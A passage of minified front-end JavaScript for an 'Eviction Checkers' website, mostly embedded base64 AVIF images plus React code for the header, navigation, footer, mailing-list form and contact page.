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",Sx="data:image/avif;base64,AAAAIGZ0eXBhdmlmAAAAAGF2aWZtaWYxbWlhZk1BMUIAAAGNbWV0YQAAAAAAAAAoaGRscgAAAAAAAAAAcGljdAAAAAAAAAAAAAAAAGxpYmF2aWYAAAAADnBpdG0AAAAAAAEAAAAsaWxvYwAAAABEAAACAAEAAAABAAAExwAAAREAAgAAAAEAAAG1AAADEgAAAEJpaW5mAAAAAAACAAAAGmluZmUCAAAAAAEAAGF2MDFDb2xvcgAAAAAaaW5mZQIAAAAAAgAAYXYwMUFscGhhAAAAABppcmVmAAAAAAAAAA5hdXhsAAIAAQABAAAAw2lwcnAAAACdaXBjbwAAABRpc3BlAAAAAAAAAF4AAAAUAAAAEHBpeGkAAAAAAwgICAAAAAxhdjFDgQAMAAAAABNjb2xybmNseAACAAIAAoAAAAAOcGl4aQAAAAABCAAAAAxhdjFDgQAcAAAAADhhdXhDAAAAAHVybjptcGVnOm1wZWdCOmNpY3A6c3lzdGVtczphdXhpbGlhcnk6YWxwaGEAAAAAHmlwbWEAAAAAAAAAAgABBAECgwQAAgQBBYYHAAAEK21kYXQSAAoKAAAAAyXZm18lQDKBBhAAmwBxxIJA8UBHEMudOsd+Z2EtWEvVbTw3gwxw/2AYibk78aNkhOYMc1OqF+ohrCt29b2mRBfTE6wLnJ2puD3Kv6mDJLP+4ijGt5HJLelmq5wfGTkvtw3YUaE0GiJsS+slyWxsqRdr3zgv0lt9mEVk+s5YoXMVLk5G1R/fekIsIO/Z6SWluaeGE45dMsAPKY6BjNZZZ52NyK3001YN3Gx7Fdg1znMOBU/h06WMkJ7INZ7uVzX1J8NqSHWB5XEz1g2nGyigmqWHYHgb2A6kz0tY/76VSvHsehet3J1XCr2WCBs+PjDAavxped/C+2uP/NpdoNl83LGUHGBdE9JWLgyPqX2bcd2f9TQ5gT9TTaE19TcaI6EIMNExMZRnX71x+ecETFvYaqwX5UmBxFXr5gTPuXqd3ZeFoLa5NlB8H1omqRjyLqLYSZgor1snJMXgd7m6pQFXcaceq9KmCwnvLBwDW+eweLDPgee405ruYJ54uOS8DjwdVLgVx3Aompr32d4IEksvQxGlH0huZoiff5GTttzQmKxN4jgKpeOTQZoxaFMsmUTpLuDEn3xje5KhDMykV/o27wtfqKVKWvlEiI3BKx+QFSDsVgL9bbNRrJFU7D/4IIlErAtK9qIU+SvxfA06cGBpm1yDD6zcPtYb2hJnSN4l13tmWWhfR9IqknJiLwyhvHmN8Ldrwtk8hkhJgZxBX+2uNUG0JrMcoq7Hb1tqbcImqwZO2zIWfKiDzx7FXbbeBVR0NHUhd426+B2J6tI9d97FyoIYZg9hBXx36IcU7d6R3vHzf55cb3s3BmWByMJ5njrEDu6iX7xjDE7b2vuYI1a5WJWM6vVuJGjQIcCjFcV9CGMLOug0nsPS2K6ltj3+lFEapPlfKs6dt5ggKHwHJh5x6kFK/ykz8PdSHDtft61ieeb5GD+PeBi/5YOFu37PObQV6INPdwuvVrwbn4YeTkzJAzJL51cI0E5HR+vw+8WVr4hAYWPtYZnP6NluW5sV5NxKLGJiS79Wqlfb5LwSAAoKAAAAAyXZm18hCDKAAhAAkAAMMMMSCCTrobs5P4VRjnJfcwpAKNJfWzKw4Dh1XBCYQmYRCjR1UG/uKYCg7NOMZclEfhZn6GC3DOs2gw4IP///9bPRuxuxuxu6KAcKHDCaOMmN3YAWJ6mVwvR2izdxb/SdahXeJs/pIMxB/Ui0liyus3F37u5Pl9wwxpSXtvh5erLCN5EW0bOrNOD2jXJ0CvkWxFfEArKoMRf8bkSDJiljPdXsACapAMY9pk14ILoQjnBBp8bbVKSR022vMh/+tPME9aZcPr4Nm0kdn7RveJr3t+jml5s7zL55vuJPkEbGhcrXqNEGKR5Jk4LSX+FOdNoeODoN21JTLUxcr4A=",Nx="data:image/avif;base64,AAAAIGZ0eXBhdmlmAAAAAGF2aWZtaWYxbWlhZk1BMUIAAAGNbWV0YQAAAAAAAAAoaGRscgAAAAAAAAAAcGljdAAAAAAAAAAAAAAAAGxpYmF2aWYAAAAADnBpdG0AAAAAAAEAAAAsaWxvYwAAAABEAAACAAEAAAABAAADvQAAAUEAAgAAAAEAAAG1AAACCAAAAEJpaW5mAAAAAAACAAAAGmluZmUCAAAAAAEAAGF2MDFDb2xvcgAAAAAaaW5mZQIAAAAAAgAAYXYwMUFscGhhAAAAABppcmVmAAAAAAAAAA5hdXhsAAIAAQABAAAAw2lwcnAAAACdaXBjbwAAABRpc3BlAAAAAAAAAEEAAAAUAAAAEHBpeGkAAAAAAwgICAAAAAxhdjFDgQAMAAAAABNjb2xybmNseAACAAIAAoAAAAAOcGl4aQAAAAABCAAAAAxhdjFDgQAcAAAAADhhdXhDAAAAAHVybjptcGVnOm1wZWdCOmNpY3A6c3lzdGVtczphdXhpbGlhcnk6YWxwaGEAAAAAHmlwbWEAAAAAAAAAAgABBAECgwQAAgQBBYYHAAADUW1kYXQSAAoKAAAAAyQJm18lQDL3AxAAmwBxxIJA8ZOKtaqffRVGxkvZGVmI91CovaAKVAWYFmvQFLVI/YlTcwNCD4SK81TMKEcrgbBACzdZm+d0IIIaHD0UFD7GxwQS9/qLBle3nH8c7Xr1hSEp4RIuXsprgvX18xzMRGfHwb0s3pRvqnQBiiPEPsOTk2mmz6lH3amR9eOgpTeumfudrak8BcKlEq4yFHC894gZ0CXAe2QgyANPdJdNRsyokwnRRkRGIe6FJVo90abLUmaXYFjRbWJcr/6bZP01IhnQBTPrBA4iZPzaVhoJT/tO0xrQAsJ5sEkD4WRVBTMPxHTE7EoxLdtcSUum2HI+D0nCrWzCEKP8NA42wF+YOiKz35v5nJvZ2ouKoC1sThGKmCf/58xJByNioRVbEx8/sgVJxSFsUJ5e6+L1RJjdes25KOb/1JLWwauGHaYoDT4UyA7Y2zEhCRbovf5qWETmcf0REv4r0Pl4DKHj0wGUuqoBDKSzs11C/KE9vXOKlo4Tp3pf9boin6NlpSpGsc3g6btx6GN6PgpepYnLcxwrjGLfdlNKuH7cRSdFuCuGzAheMgeq+kHyQVhJwi38jPXVt/RyNVcwY9YYX4fzukQtGU+0UzJyqkFenxqx/sc2kejIzRxzgOI085FA7E2RfdRvFBvQlwX9NAFOkRT/wyWe4VroEgAKCgAAAAMkCZtfIQgysAIQAJAADDDDEggk66Hv4sMb7JZoNxCD38En6A2CVPtm0baXR8jWAiqVBSXs7vm/nWJEbCTAriHmJvqdXl03Pr+VMR714DL7S7tqpe8JEtGy7Gdyx8+KEIoSpx1Auqe6qNOeAbUJuMEjhvvBElE4TGqLbLscZR0HTIeWoeWSMpnpznh5T7Dnq0L8OmoTrLTp+YJ21Z39KlSy99/JYsNucVWvRuWQR4A2UqmrBEzJ1bOaluUlHf7DGHPRUUlv/fn9D10o/Ljnq4nMgSuQY5o6d/rPHz6aHKSyg4b6wmAR+6BwyyJM30vuKwRZ2bnUThsK+v79g3ZfUKXSSbSHRCYlXLU21orF0QOlS9pG2hJLU/vnPfZcnxxsANaQBiOJfGRaDbut05P/0EEFE5NRQ6LfR29A",Rx="data:image/avif;base64,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",O5=()=>{const[t,e]=O.useState(!1),n=()=>{e(!t)};return g.jsxs(g.Fragment,{children:[g.jsx("div",{className:"sticky top-0 z-50 bg-white shadow ",children:g.jsxs("div",{className:"w-[96%] md:w-[85%] h-[65px] md:h-[80px] px-4 mx-auto flex items-center justify-between",children:[g.jsxs("div",{className:"flex flex-row gap-2 text-2xl font-bold cus_font",children:[g.jsx(Yr,{children:g.jsx("h1",{className:"text-[#0057e1]",children:"Eviction"})}),g.jsx(Yr,{children:g.jsx("h1",{className:"text-[#ff8c4f]",children:"Checkers"})})]}),g.jsxs("div",{className:"hidden md:flex flex-row justify-center items-center gap-3",children:[g.jsx("img",{src:Rx,alt:"img4"}),g.jsx("img",{src:Sx,alt:"img2"}),g.jsx("img",{src:Nx,alt:"img3"}),g.jsx("img",{src:Cx,alt:"img1"})]}),g.jsxs("div",{className:"hidden md:flex flex-row items-center gap-1",children:[g.jsx("span",{className:"bg-blue-500 text-white rounded-full text-2xl p-2",children:g.jsx(Tx,{})}),g.jsx("button",{className:"text-blue-500",children:"Log In"})]}),g.jsx("div",{className:"md:hidden text-2xl cursor-pointer",onClick:n,children:t?g.jsx(Iv,{}):g.jsx(_5,{})})]})}),g.jsx("div",{className:`fixed top-0 right-0 h-full w-[250px] mt-27 bg-white shadow-lg z-40 transition-transform duration-300 ${t?"translate-x-0":"translate-x-full"}`,children:g.jsx("div",{className:"p-4 flex flex-col gap-6",children:g.jsxs("div",{className:"flex flex-col items-center gap-3",children:[g.jsxs("div",{className:"text-xl font-bold text-[#0057e1]",children:["Eviction ",g.jsx("span",{className:"text-[#ff8c4f]",children:"Checkers"})]}),g.jsxs("div",{className:"",children:[g.jsx("img",{src:Cx,alt:"img1",className:"w-16"}),g.jsx("img",{src:Sx,alt:"img2",className:"w-16"}),g.jsx("img",{src:Nx,alt:"img3",className:"w-16"}),g.jsx("img",{src:Rx,alt:"img4",className:"w-16"})]}),g.jsxs("div",{className:"flex items-center gap-2 mt-4",children:[g.jsx(Tx,{className:"text-blue-500 text-2xl"}),g.jsx("button",{className:"text-blue-500",children:"Log In"})]})]})})})]})},P5=()=>g.jsxs("footer",{className:"bg-gray-900 text-white pt-10 pb-5",children:[g.jsxs("div",{className:"w-[90%] max-w-7xl mx-auto grid grid-cols-1 md:grid-cols-4 gap-8",children:[g.jsxs("div",{children:[g.jsx("h2",{className:"text-xl font-semibold mb-4 text-orange-400",children:"Eviction Checkers"}),g.jsxs("p",{className:"text-sm",children:["34077 Paseo Padre Pkwy Apt 121",g.jsx("br",{}),"Fremont, CA"]}),g.jsxs("p",{className:"text-sm mt-2",children:["Support: ",g.jsx("a",{href:"mailto:support@evictioncheckres.com",className:"underline",children:"support@evictioncheckres.com"})]}),g.jsx("p",{className:"text-sm",children:"Phone: +1 315 250 0236"})]}),g.jsxs("div",{children:[g.jsx("h3",{className:"text-lg font-semibold mb-3 text-orange-400",children:"Quick Links"}),g.jsxs("ul",{className:"space-y-2 text-sm",children:[g.jsx("li",{children:g.jsx("a",{href:"#",className:"hover:underline",children:"Home"})}),g.jsx("li",{children:g.jsx("a",{href:"#",className:"hover:underline",children:"Pricing"})}),g.jsx("li",{children:g.jsx("a",{href:"#",className:"hover:underline",children:"Credit Score"})}),g.jsx("li",{children:g.jsx("a",{href:"#",className:"hover:underline",children:"Contact"})})]})]}),g.jsxs("div",{children:[g.jsx("h3",{className:"text-lg font-semibold mb-3 text-orange-400",children:"Resources"}),g.jsxs("ul",{className:"space-y-2 text-sm",children:[g.jsx("li",{children:g.jsx("a",{href:"#",className:"hover:underline",children:"Privacy Policy"})}),g.jsx("li",{children:g.jsx("a",{href:"#",className:"hover:underline",children:"Terms & Conditions"})}),g.jsx("li",{children:g.jsx("a",{href:"#",className:"hover:underline",children:"FAQs"})}),g.jsx("li",{children:g.jsx("a",{href:"#",className:"hover:underline",children:"Support"})})]})]}),g.jsxs("div",{children:[g.jsx("h3",{className:"text-lg font-semibold mb-3 text-orange-400",children:"Join Our Mailing List"}),g.jsxs("form",{className:"flex flex-col gap-3",children:[g.jsx("input",{type:"email",placeholder:"Enter your email",className:"px-4 py-2 rounded bg-gray-100 text-black focus:outline-none"}),g.jsx("button",{type:"submit",className:"bg-orange-500 hover:bg-orange-600 text-white py-2 rounded transition duration-300",children:"Submit"})]})]})]}),g.jsxs("div",{className:"text-center text-sm text-gray-400 mt-8 border-t border-gray-700 pt-4",children:[" ",new Date().getFullYear()," Eviction Checkers. All rights reserved."]})]}),j5=()=>{const{pathname:t}=bi();return O.useEffect(()=>{window.scrollTo({top:0,left:0,behavior:"instant"})},[t]),null};function L5(){return g.jsx(g.Fragment,{children:g.jsxs("div",{children:[g.jsx(j5,{}),g.jsx(O5,{}),g.jsx(yT,{}),g.jsx(P5,{})]})})}const CT=()=>g.jsx("div",{className:"mt-10 ",children:g.jsx("div",{className:"text-center",children:g.jsxs("p",{className:"cus_font2 text-white font-extrabold",children:["By continuing, I provide my written consent to receive marketing messages from evictioncheckres.com and/or its ",g.jsx("br",{})," partners via email, approximately 5 messages in 12 days."]})})}),V5=()=>g.jsxs("div",{className:"mt-10",children:[g.jsx("h1",{className:"text-7xl text-[#008afc] font-bold text-center pb-0",children:"CONTACT US"}),g.jsxs("div",{className:"max-w-md mx-auto px-4 py-10 text-center text-black",children:[g.jsxs("div",{className:"mb-6 leading-relaxed",children:[g.jsx("p",{children:"34077 Paseo Padre Pkwy Apt 121 Fremont CA"}),g.jsx("p",{children:"Support@evictioncheckres.com"}),g.jsx("p",{children:"+1315 250 0236"})]}),g.jsxs("div",{children:[g.jsx("h2",{className:"text-orange-500 font-bold text-lg mb-2",children:"JOIN OUR MAILING LIST"}),g.jsxs("form",{className:"flex flex-col items-center gap-3",children:[g.jsxs("div",{className:"w-full text-left",children:[g.jsx("label",{htmlFor:"email",className:"block mb-1",children:"Email"}),g.jsx("input",{type:"email",id:"email",className:"w-full border border-black px-3 py-2 focus:outline-none",placeholder:"Enter your email"})]}),g.jsx("button",{type:"submit",className:"bg-[#2c2c2c] text-white w-full py-2",children:"Submit"})]})]})]})]}),U5="data:image/avif;base64,AAAAIGZ0eXBhdmlmAAAAAGF2aWZtaWYxbWlhZk1BMUIAAAGNbWV0YQAAAAAAAAAoaGRscgAAAAAAAAAAcGljdAAAAAAAAAAAAAAAAGxpYmF2aWYAAAAADnBpdG0AAAAAAAEAAAAsaWxvYwAAAABEAAACAAEAAAABAAAB9gAADRYAAgAAAAEAAAG1AAAAQQAAAEJpaW5mAAAAAAACAAAAGmluZmUCAAAAAAEAAGF2MDFDb2xvcgAAAAAaaW5mZQIAAAAAAgAAYXYwMUFscGhhAAAAABppcmVmAAAAAAAAAA5hdXhsAAIAAQABAAAAw2lwcnAAAACdaXBjbwAAABRpc3BlAAAAAAAAATcAAACgAAAAEHBpeGkAAAAAAwgICAAAAAxhdjFDgQAMAAAAABNjb2xybmNseAACAAIAAoAAAAAOcGl4aQAAAAABCAAAAAxhdjFDgQAcAAAAADhhdXhDAAAAAHVybjptcGVnOm1wZWdCOmNpY3A6c3lzdGVtczphdXhpbGlhcnk6YWxwaGEAAAAAHmlwbWEAAAAAAAAAAgABBAECgwQAAgQBBYYHAAANX21kYXQSAAoKAAAABDzafNr5KjIxEACNgDjiQSDDNNK2z7NHyHJCAxoGjFloU6C4yQv7Tjtctssl1q/hSbW5aVSUHql+DRIACgsAAAAEPNp82vkIQDKEGhAAiQAIIIIJBBLZtdF8Vce4Su9W2nDa+MB/SVLRmkluhMiC8WppcXHu0Nm4OaATwvnJUIBfnzOQmJoVeRdQBVa/fF3327ODz4vJkPEHRn4rmCMDk9Mqge2URMUQlfz84kgYoV3PDk11MyN592OZbD2c2pulgcxxNThvpdlagN9yY8U0UrleQnRtb6TPl11NbswolvF7ahgiuCMFyO6dz5OP9aFKdk++uAwi2oj/6atDsn10C+/7cyjnw7XbYDs0Z5Q5Ve8Ah5olkP7gpKtv1fL6UK941fQgiAs3Pw4YKDxj1bXbXKxGOEbsJvCJeNVhOSB9Skx/k3KdwhDsDVSaus2SD0Dj3aVZZTNOxRTMn6vB7ycPkyOVZEQKE/xaEKwUFE54mvKHp/wtymzg5MTVz4Gkgaf1ZlwaGsNF0Zq5tVpWiTglI34w/wqRWg5jfUYBZpSwTEYwEEctRGx7+gyOSn9nG/ARmJY9BFK7UPluXr2/eeh3rVzqIcP46BwhYmW2cXK/RsbqBqn9PWmfEQIEAjvjd09muXbsSHO91FvQ/0+aPRTPcCsk1mrI2gdmjL92FnubhbDz4dRYkBxssYP59W+vDp7Xv89rlFPtF5J6m+VHDznEugMlZ70TXZYhPtf4mriCchSN6xTOvnrNJZQck8yheZWKnH40L3LlGTJi2xymVL6FByqA4w13USMkqaTnAn85RvVEuxrc6ZFlNKOwtRMv8fSldxHcR4HuvC+/iDaB9gvojHsGnkHQK1py6wAQz7YJBGYIw6X6t0alGvkxVN+7nEWxlozcfegdp2JcT2ycorTOisHl9VwQGXLBfUKWFe8k+CGylZQ4mlNLlNx0LMSAtbvZKPExqfYajdpGkHKIr1huvPtRUJzGbS1ahP1DrQ38XnFKzWAL03z9ynPlsmWBk5HZzTRnxpZX0HFvTLXFCmYP8pO8H2Wr/yKXj0YPuXUhe4FtWr/ej8z4z5aUW2bsXmzMoi/0uvue0cSXVgtc8iKQMURQanTEOWpTYWsVNjLopAYI4wloQlw9nWEO4tx4BvBoEss6E97Gx5BKgeh0QiVAHXt9ZrT60Ub6m/fhtusCSpleMNMev4NM9GyDIYoJ/wafXImfoNdOqGN5dgmAKaVSWfY0PV/8zS6HqpiDXTE7ZA176OA/BoR8ATJzBacQXOfD0y/an2GdC2HcKVja0LcW6/0dO+qNrAwy2k+bI7HoJ8xf/C4Llml4+iT9gtSQ46Y2Zoi+Hy0abkuH2KBxaVAbqZ3u1DX16eWBSFmUmNkg/zZxGuDGTaLXORzmeEaKjvHwEvQUcqkSMFMw9FN6DVAqlLMciCodwC1tfaNoKdltjcHbC59mhAZiRtaV2T2dwNodhz7vlslsjFHfSRAwssmLSa//ykpPcDnPPME6tovHfYW9WphzRIcukXjjZAAgOMhxnJqUGrXXwXlzBQ0FEA/5Ds91+6J8ARcgHamJZSUkoGEQ8DvFsFJxE40Znh76ddybSKfXMk/aeWaLEAz92x9KwEC43Ys7RwPqqKYRKZEE3CFiEiDmpGGj+B67HxuMjnju20PTG5SJLqnVe1Edq0miPm5QYrVvkhrr0arLRT8a0bc07xoldWrxS7IoEWIvWxvs7XMijAxIyUykgr9Y6Co8VVl7KQHl3JAuDBwAZq74fh6eZ/NFNXVIrVLhC0U17aCRXsau8cHFqkuviVFNR0YDf/8iC1iFkk9sxGnNvR9shUxt8pKizxW6ZEoyIuc+hO/rl7CrG8EMj9bzW9zZz3A/0l86sSDVM5sJIligvPxyTEKD0w8E3fv3+iVsksEEc2j+PJGXivUyRaicdOyWezvI7CUef3PZ6mVadsdY6d42q1w++CuNfVSZ/vVqZC/cudwBCx+s8L5e9OGhnvq4QZ10Z/z69e0Xbcd7yX3/v6F+7+